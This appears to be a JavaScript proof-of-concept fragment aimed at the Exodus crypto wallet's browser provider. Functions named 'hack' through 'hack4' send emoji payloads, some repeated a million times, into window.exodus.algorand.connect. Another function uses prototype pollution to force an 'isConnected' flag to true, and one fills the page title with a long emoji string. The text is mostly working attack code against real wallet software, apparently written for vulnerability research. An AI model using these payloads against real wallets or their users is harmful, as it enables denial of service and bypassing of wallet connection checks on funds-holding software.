///////////////////////////////////////////////////////////////////////////////////
/////////////////////// REST //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////

            function prot_pollute() {
                window.exodus.p = {}
                window.exodus.p["__proto__"]["isConnected"] = true
            }

            function hack() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack2() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function hack3() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack4() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function change_title() {
                var payload = '\uD83D\uDC04'.repeat(10000);
                //console.log("[*] " + payload);
                document.title = payload;
            }